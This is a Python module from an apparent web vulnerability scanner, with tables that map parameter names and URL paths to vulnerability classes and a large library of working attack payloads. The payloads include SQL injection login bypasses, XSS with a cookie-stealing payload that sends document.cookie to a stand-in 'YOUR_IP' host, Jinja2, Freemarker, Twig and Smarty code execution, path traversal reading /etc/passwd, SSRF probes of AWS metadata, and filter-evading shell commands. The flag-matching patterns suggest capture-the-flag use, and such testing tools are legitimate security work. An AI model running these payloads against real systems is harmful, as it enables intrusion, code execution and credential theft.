# -*- coding: utf-8 -*-
"""url_analyzer._signatures -- Vulnerability signature tables: parameter / path / payload knowledge base.

从 yang_web/core/url_analyzer.py 机械拆分而来, 逐行搬运, 行为等价。
"""

from typing import List, Dict, Tuple, Optional, Callable



# ============================================================================
#  Parameter Signatures
# ============================================================================

PARAM_SIGNATURES: Dict[str, List[Tuple[str, int, str]]] = {
    # SQLi
    "id":        [("SQLi", 85, "param 'id' commonly used for DB lookups")],
    "uid":       [("SQLi", 80, "param 'uid' likely user ID query")],
    "user":      [("SQLi", 70, "param 'user' often used in SQL queries")],
    "username":  [("SQLi", 70, "param 'username' likely SQL lookup")],
    "product":   [("SQLi", 65, "param 'product' likely product ID query")],
    "article":   [("SQLi", 65, "param 'article' likely article ID query")],
    "news":      [("SQLi", 60, "param 'news' likely news ID query")],
    "cat":       [("SQLi", 65, "param 'cat' likely category ID filter")],
    "category":  [("SQLi", 65, "param 'category' likely category filter")],
    "pid":       [("SQLi", 80, "param 'pid' likely parent/product ID")],
    "no":        [("SQLi", 70, "param 'no' likely numeric identifier")],
    "num":       [("SQLi", 60, "param 'num' likely numeric parameter")],
    "sort":      [("SQLi", 60, "param 'sort' possibly feeds ORDER BY")],
    "order":     [("SQLi", 70, "param 'order' possibly feeds ORDER BY")],
    "search":    [("SQLi", 60, "param 'search' likely SQL query"), ("XSS", 55, "search queries may reflect XSS")],
    "keyword":   [("SQLi", 60, "param 'keyword' used in search queries"), ("XSS", 50, "keyword may reflect XSS")],
    "query":     [("SQLi", 60, "param 'query' often SQL query string"), ("XSS", 50, "query may reflect XSS")],
    "filter":    [("SQLi", 55, "param 'filter' likely SQL WHERE clause")],
    "offset":    [("SQLi", 50, "param 'offset' likely LIMIT/OFFSET clause")],
    "limit":     [("SQLi", 50, "param 'limit' likely LIMIT clause")],
    "page_id":   [("SQLi", 60, "param 'page_id' likely page ID query")],
    "item":      [("SQLi", 55, "param 'item' likely item ID query")],
    "row":       [("SQLi", 50, "param 'row' possibly row selector")],
    "table":     [("SQLi", 70, "param 'table' suspicious table name param")],
    "column":    [("SQLi", 65, "param 'column' suspicious column selector")],
    "record":    [("SQLi", 55, "param 'record' likely record ID query")],
    "type":      [("SQLi", 50, "param 'type' often used in filter queries")],
    # XSS
    "msg":       [("XSS", 75, "param 'msg' commonly reflected as message")],
    "message":   [("XSS", 75, "param 'message' commonly reflected")],
    "name":      [("XSS", 65, "param 'name' often reflected in page"), ("SSTI", 35, "name may be templated")],
    "title":     [("XSS", 60, "param 'title' often reflected in page")],
    "comment":   [("XSS", 70, "param 'comment' commonly reflected"), ("SQLi", 40, "comments may be in DB")],
    "feedback":  [("XSS", 65, "param 'feedback' commonly reflected")],
    "desc":      [("XSS", 55, "param 'desc' often reflected description")],
    "content":   [("XSS", 55, "param 'content' often reflected"), ("SSTI", 30, "content may be templated")],
    "text":      [("XSS", 55, "param 'text' often reflected"), ("SSTI", 35, "text may be templated")],
    "email":     [("XSS", 50, "param 'email' may be reflected in page")],
    "nickname":  [("XSS", 55, "param 'nickname' often reflected in page")],
    "q":         [("XSS", 55, "param 'q' common search shortname"), ("SQLi", 55, "shortname often SQL query")],
    "body":      [("XSS", 55, "param 'body' often reflected content")],
    "subject":   [("XSS", 50, "param 'subject' may be reflected")],
    "reply":     [("XSS", 55, "param 'reply' may be reflected")],
    "note":      [("XSS", 50, "param 'note' may be reflected in page")],
    # SSTI
    "template":  [("SSTI", 85, "param 'template' strongly suggests template engine")],
    "tpl":       [("SSTI", 80, "param 'tpl' short for template")],
    "view":      [("SSTI", 60, "param 'view' may control template rendering")],
    "page":      [("SSTI", 40, "param 'page' may control template inclusion"), ("LFI", 70, "param 'page' may include files")],
    "render":    [("SSTI", 75, "param 'render' strongly suggests template rendering")],
    "preview":   [("SSTI", 50, "param 'preview' may use template rendering")],
    # LFI
    "file":      [("LFI", 90, "param 'file' strongly suggests file inclusion")],
    "path":      [("LFI", 80, "param 'path' likely used for file/directory access")],
    "include":   [("LFI", 90, "param 'include' strongly suggests file inclusion")],
    "require":   [("LFI", 85, "param 'require' strongly suggests file inclusion")],
    "filename":  [("LFI", 80, "param 'filename' suggests file access")],
    "document":  [("LFI", 60, "param 'document' may reference files")],
    "folder":    [("LFI", 65, "param 'folder' likely directory access")],
    "dir":       [("LFI", 70, "param 'dir' likely directory listing")],
    "lang":      [("LFI", 60, "param 'lang' may load language files")],
    "locale":    [("LFI", 55, "param 'locale' may load locale files")],
    "module":    [("LFI", 55, "param 'module' may load module files")],
    "load":      [("LFI", 65, "param 'load' may load external files")],
    # SSRF
    "url":       [("SSRF", 90, "param 'url' strongly suggests SSRF target")],
    "link":      [("SSRF", 80, "param 'link' likely server-fetched URL")],
    "src":       [("SSRF", 75, "param 'src' likely server-fetched source")],
    "source":    [("SSRF", 70, "param 'source' likely server-fetched content")],
    "target":    [("SSRF", 70, "param 'target' may be proxy target")],
    "dest":      [("SSRF", 70, "param 'dest' may be proxy destination")],
    "uri":       [("SSRF", 85, "param 'uri' strongly suggests URL fetch")],
    "image":     [("SSRF", 65, "param 'image' may be server-fetched image URL")],
    "img":       [("SSRF", 65, "param 'img' short for image URL")],
    "avatar":    [("SSRF", 60, "param 'avatar' may be fetched avatar URL")],
    "proxy":     [("SSRF", 80, "param 'proxy' strongly suggests proxying")],
    "fetch":     [("SSRF", 80, "param 'fetch' strongly suggests URL fetching")],
    "web":       [("SSRF", 55, "param 'web' may be web resource URL")],
    # RCE
    "cmd":       [("RCE", 90, "param 'cmd' strongly suggests command execution")],
    "command":   [("RCE", 90, "param 'command' strongly suggests command execution")],
    "exec":      [("RCE", 85, "param 'exec' strongly suggests command execution")],
    "shell":     [("RCE", 85, "param 'shell' strongly suggests shell command")],
    "ping":      [("RCE", 80, "param 'ping' may execute ping command")],
    "ip":        [("RCE", 60, "param 'ip' may be used in system command")],
    "host":      [("RCE", 55, "param 'host' may be used in system command"), ("SSRF", 40, "host may also be SSRF target")],
    "domain":    [("RCE", 55, "param 'domain' may be used in system command")],
    # Upload
    "upload":    [("Upload", 85, "param 'upload' suggests file upload endpoint")],
}


# ============================================================================
#  Path Patterns
# ============================================================================

PATH_PATTERNS: List[Tuple[str, str, int, str]] = [
    (r"\.php",       "PHP",  80, "PHP extension, likely PHP application"),
    (r"\.asp",       "SQLi", 50, "ASP extension, commonly paired with SQL vulns"),
    (r"\.jsp",       "SSTI", 40, "JSP extension, Java template engine possible"),
    (r"/upload",     "Upload", 75, "Path contains upload, file upload endpoint"),
    (r"/admin",      "SQLi", 50, "Admin panel, often has SQL injection surface"),
    (r"/login",      "SQLi", 55, "Login page, commonly SQL injection target"),
    (r"/search",     "SQLi", 50, "Search page, SQL/XSS injection surface"),
    (r"/proxy",      "SSRF", 75, "Proxy path, strong SSRF indicator"),
    (r"/fetch",      "SSRF", 70, "Fetch path, SSRF indicator"),
    (r"/api",        "SQLi", 40, "API endpoint, may have SQL injection surface"),
    (r"/debug",      "SSTI", 40, "Debug path, may expose template internals"),
    (r"/ping",       "RCE", 70, "Ping endpoint, commonly vulnerable to command injection"),
    (r"/download",   "LFI", 65, "Download endpoint, path traversal risk"),
    (r"/backup",     "LFI", 55, "Backup path, file access risk"),
    (r"/config",     "LFI", 60, "Config path, sensitive file access risk"),
    (r"/cmd",        "RCE", 80, "Cmd endpoint, strong command injection indicator"),
    (r"/exec",       "RCE", 75, "Exec endpoint, command execution indicator"),
    (r"/shell",      "RCE", 80, "Shell endpoint, remote command execution risk"),
    (r"/console",    "RCE", 60, "Console endpoint, possible command execution"),
    (r"/wp-admin",   "SQLi", 55, "WordPress admin, SQL injection surface"),
    (r"/manager",    "Upload", 50, "Manager path, file upload risk"),
]


# ============================================================================
#  Attack Payloads
# ============================================================================

ATTACK_PAYLOADS: Dict[str, List[Dict]] = {
    "SQLi": [
        {"name": "引号闭合探测", "payload": "\u0027", "method": "append", "detect": "error", "match": [], "tip": "添加单引号检测SQL语法错误"},
        {"name": "OR永真绕过", "payload": "admin\u0027 OR \u00271\u0027=\u00271", "method": "replace", "detect": "success", "match": [], "tip": "OR 1=1 绕过登录认证"},
        {"name": "联合查询探测", "payload": "\u0027 UNION SELECT 1,2,3-- ", "method": "append", "detect": "content", "match": ["1", "2", "3"], "tip": "UNION SELECT 定位回显列"},
        {"name": "延时盲注(MySQL)", "payload": "\u0027 AND sleep(3)-- ", "method": "append", "detect": "timeout", "match": [], "tip": "sleep延时检测SQL盲注"},
        {"name": "布尔盲注", "payload": "\u0027 AND 1=1-- ", "method": "append", "detect": "normal", "match": [], "tip": "布尔真值测试; 对比 AND 1=2 确认注入点"},
        {"name": "报错注入(updatexml)", "payload": "\u0027 AND updatexml(1,concat(0x7e,database()),1)-- ", "method": "append", "detect": "error", "match": [], "tip": "updatexml报错提取数据库名"},
        {"name": "注释符绕过", "payload": "\u0027 OR 1=1#", "method": "append", "detect": "success", "match": [], "tip": "#号注释绕过MySQL单行限制"},
        {"name": "排序探测列数", "payload": "\u0027 ORDER BY 5-- ", "method": "append", "detect": "error", "match": [], "tip": "ORDER BY 探测列数"},
        {"name": "查数据库名", "payload": "\u0027 UNION SELECT 1,database(),3-- ", "method": "append", "detect": "content", "match": [], "tip": "UNION SELECT 提取数据库名"},
    ],
    "XSS": [
        {"name": "基础script标签", "payload": "\u003Cscript\u003Ealert(1)\u003C/script\u003E", "method": "replace", "detect": "content", "match": ["\u003Cscript\u003Ealert(1)\u003C/script\u003E"], "tip": "反射型XSS script标签注入"},
        {"name": "IMG onerror", "payload": "\u003Cimg src=x onerror=alert(1)\u003E", "method": "replace", "detect": "content", "match": ["onerror=alert(1)"], "tip": "绕过script过滤, img + onerror"},
        {"name": "SVG onload", "payload": "\u003Csvg onload=alert(1)\u003E", "method": "replace", "detect": "content", "match": ["onload=alert(1)"], "tip": "SVG onload 事件处理器"},
        {"name": "属性逃逸", "payload": "\u0022\u0027\u003E\u003Cscript\u003Ealert(1)\u003C/script\u003E", "method": "replace", "detect": "content", "match": ["\u003Cscript\u003Ealert(1)"], "tip": "闭合HTML属性上下文"},
        {"name": "Cookie窃取", "payload": "\u003Cimg src=x onerror=this.src=\u0027http://YOUR_IP/?c=\u0027+document.cookie\u003E", "method": "replace", "detect": "content", "match": ["document.cookie"], "tip": "窃取Cookie发送到攻击服务器"},
        {"name": "IFrame注入", "payload": "\u003Ciframe src=javascript:alert(1)\u003E", "method": "replace", "detect": "content", "match": ["\u003Ciframe"], "tip": "IFrame XSS载荷"},
    ],
    "SSTI": [
        {"name": "探测 {{7*7}}", "payload": "{{7*7}}", "method": "replace", "detect": "content", "match": ["49"], "tip": "输出49则确认 Jinja2/Twig SSTI"},
        {"name": "探测 ${7*7}", "payload": "${7*7}", "method": "replace", "detect": "content", "match": ["49"], "tip": "输出49则确认 Freemarker/Mako SSTI"},
        {"name": "Jinja2 RCE(经典)", "payload": "{{ cycler.__init__.__globals__.os.popen(\u0027id\u0027).read() }}", "method": "replace", "detect": "content", "match": ["uid=", "gid="], "tip": "Jinja2 RCE 通过 cycler globals"},
        {"name": "Jinja2 读文件", "payload": "{{ get_flashed_messages.__globals__.__builtins__.open(\u0027/etc/passwd\u0027).read() }}", "method": "replace", "detect": "content", "match": ["root:", "nobody:"], "tip": "Jinja2 globals builtins 读文件"},
        {"name": "Freemarker RCE", "payload": "\u003C#assign ex=\u0027freemarker.template.utility.Execute\u0027?new()\u003E${ex(\u0027id\u0027)}", "method": "replace", "detect": "content", "match": ["uid=", "gid="], "tip": "Freemarker RCE Execute工具类"},
        {"name": "Twig RCE", "payload": "{{ [\u0027id\u0027]|filter(\u0027system\u0027) }}", "method": "replace", "detect": "content", "match": [], "tip": "Twig RCE 通过 filter + system"},
        {"name": "Smarty RCE", "payload": "{system(\u0027id\u0027)}", "method": "replace", "detect": "content", "match": ["uid=", "gid="], "tip": "Smarty RCE system 函数"},
    ],
    "LFI": [
        {"name": "读passwd文件", "payload": "../../../etc/passwd", "method": "replace", "detect": "content", "match": ["root:", "nobody:"], "tip": "经典路径穿越读 /etc/passwd"},
        {"name": "URL编码穿越", "payload": "..%2f..%2f..%2fetc/passwd", "method": "replace", "detect": "content", "match": ["root:"], "tip": "URL编码绕过过滤"},
        {"name": "Windows穿越", "payload": "..\\..\\..\\windows\\win.ini", "method": "replace", "detect": "content", "match": ["[fonts]", "[extensions]"], "tip": "Windows路径穿越读win.ini"},
        {"name": "PHP filter Base64", "payload": "php://filter/convert.base64-encode/resource=index.php", "method": "replace", "detect": "content", "match": ["PD9waHA=", "\u003C?php"], "tip": "php://filter base64编码读PHP源码"},
        {"name": "PHP input伪协议", "payload": "php://input", "method": "replace", "detect": "normal", "match": [], "tip": "配合POST body实现RCE"},
        {"name": "Apache日志污染", "payload": "/var/log/apache2/access.log", "method": "replace", "detect": "normal", "match": [], "tip": "读取Apache日志，通过UA注入PHP代码"},
    ],
    "SSRF": [
        {"name": "探测本地SSH", "payload": "http://127.0.0.1:22", "method": "replace", "detect": "content", "match": ["SSH", "OpenSSH", "protocol"], "tip": "探测本地SSH banner确认SSRF"},
        {"name": "探测Redis", "payload": "http://127.0.0.1:6379", "method": "replace", "detect": "error", "match": [], "tip": "探测本地Redis, 报错信息确认SSRF"},
        {"name": "探测MySQL", "payload": "http://127.0.0.1:3306", "method": "replace", "detect": "content", "match": ["mysql", "caching_sha2"], "tip": "探测本地MySQL握手确认SSRF"},
        {"name": "file://读文件", "payload": "file:///etc/passwd", "method": "replace", "detect": "content", "match": ["root:", "nobody:"], "tip": "file:// 协议读本地文件"},
        {"name": "AWS元数据", "payload": "http://169.254.169.254/latest/meta-data/", "method": "replace", "detect": "content", "match": ["ami-id", "instance-id"], "tip": "访问AWS EC2元数据服务"},
        {"name": "内网探测(192.168)", "payload": "http://192.168.1.1:80", "method": "replace", "detect": "normal", "match": [], "tip": "探测192.168.x.x内网服务"},
        {"name": "内网探测(10.x)", "payload": "http://10.0.0.1:80", "method": "replace", "detect": "normal", "match": [], "tip": "探测10.x.x.x内网服务"},
    ],
    "RCE": [
        {"name": "直接执行 id", "payload": "id", "method": "replace", "detect": "content", "match": ["uid=", "gid="], "tip": "直接replace参数值，执行系统命令"},
        {"name": "列出目录 ls", "payload": "ls", "method": "replace", "detect": "normal", "match": [], "tip": "列出当前目录文件"},
        {"name": "读flag文件", "payload": "cat /fla*", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "通配符绕过WAF读flag"},
        {"name": "读flag(#注释重定向)", "payload": "cat /flag #", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "#注释掉>/dev/null等输出重定向"},
        {"name": "读flag(全八进制绕过字母+符号WAF)", "payload": "$'\\143\\141\\164' $'\\57\\146\\154\\141\\147'", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "bash $'\\ooo' 全八进制转义,绕过A-Za-z+/等黑名单"},
        {"name": "列根目录(全八进制)", "payload": "$'\\154\\163' $'\\57'", "method": "replace", "detect": "normal", "match": [], "tip": "bash八进制ls /,绕过字母+特殊符号WAF"},
        {"name": "读flag(八进制+通配)", "payload": "$'\\143\\141\\164' $'\\57\\146'*", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "八进制cat+通配符,绕过完整路径WAF"},
        {"name": "读flag($IFS绕过空格)", "payload": "cat$IFS$9/fla*", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "$IFS绕过空格WAF读flag"},
        {"name": "读flag($IFS绕过空格)", "payload": "cat$IFS$9/fla*", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "$IFS绕过空格WAF读flag"},
        {"name": "读flag(tab绕过空格)", "payload": "cat\t/fla*", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "tab字符绕过空格WAF"},
        {"name": "读flag(八进制绕过字母WAF)", "payload": "$'\\143\\141\\164' /????", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "$'\\ooo' 八进制转义绕过字母WAF(如b-z被禁)"},
        {"name": "读flag(八进制+tab绕过)", "payload": "$'\\143\\141\\164'$'\\11'/????", "method": "replace", "detect": "content", "match": ["flag{", "CTF{", "ISCC{", "Geesec{"], "tip": "八进制+tab绕过字母+空格双WAF"},
        {"name": "列根目录(八进制绕过)", "payload": "$'\\154\\163' /", "method": "replace", "detect": "normal", "match": [], "tip": "八进制ls / 绕过字母WAF"},
        {"name": "管道注入 id", "payload": "|id", "method": "append", "detect": "content", "match": ["uid=", "gid="], "tip": "管道命令链接"},
        {"name": "双&号注入", "payload": "&&id", "method": "append", "detect": "content", "match": ["uid=", "gid="], "tip": "&& 条件命令执行"},
        {"name": "whoami", "payload": "whoami", "method": "replace", "detect": "normal", "match": [], "tip": "查看当前用户"},
        {"name": "env环境变量", "payload": "env", "method": "replace", "detect": "normal", "match": [], "tip": "获取环境变量"},
        {"name": "pwd当前路径", "payload": "pwd", "method": "replace", "detect": "normal", "match": [], "tip": "获取当前工作目录"},
        {"name": "列根目录 ls /", "payload": "ls%20/", "method": "replace", "detect": "normal", "match": [], "tip": "列出根目录"},
    ],
    "PHP": [
        {"name": "PHP filter读源码", "payload": "php://filter/convert.base64-encode/resource=index.php", "method": "replace", "detect": "content", "match": ["PD9waHA=", "\u003C?php"], "tip": "php://filter base64编码读PHP源码"},
        {"name": "MD5魔法哈希", "payload": "QNKCDZO", "method": "replace", "detect": "content", "match": [], "tip": "MD5 0e前缀魔法哈希绕过==比较"},
        {"name": "数组混淆", "payload": "a[]=1", "method": "replace", "detect": "content", "match": [], "tip": "数组参数绕过 strcmp/md5 比较"},
        {"name": "assert代码注入", "payload": "\u0027.system(\u0027id\u0027).\u0027", "method": "append", "detect": "content", "match": ["uid=", "gid="], "tip": "PHP assert() 代码注入"},
    ],
    "Upload": [
        {"name": "扩展名绕过php3", "payload": "shell.php3", "method": "replace", "detect": "content", "match": [], "tip": "php3 扩展名绕过黑名单"},
        {"name": "大小写绕过", "payload": "shell.pHp", "method": "replace", "detect": "content", "match": [], "tip": "大小写混合绕过过滤"},
        {"name": "双扩展名", "payload": "shell.php.jpg", "method": "replace", "detect": "content", "match": [], "tip": "双扩展名可能解析为PHP"},
        {"name": "htaccess上传", "payload": ".htaccess", "method": "replace", "detect": "content", "match": [], "tip": "上传.htaccess覆盖配置"},
    ],
}
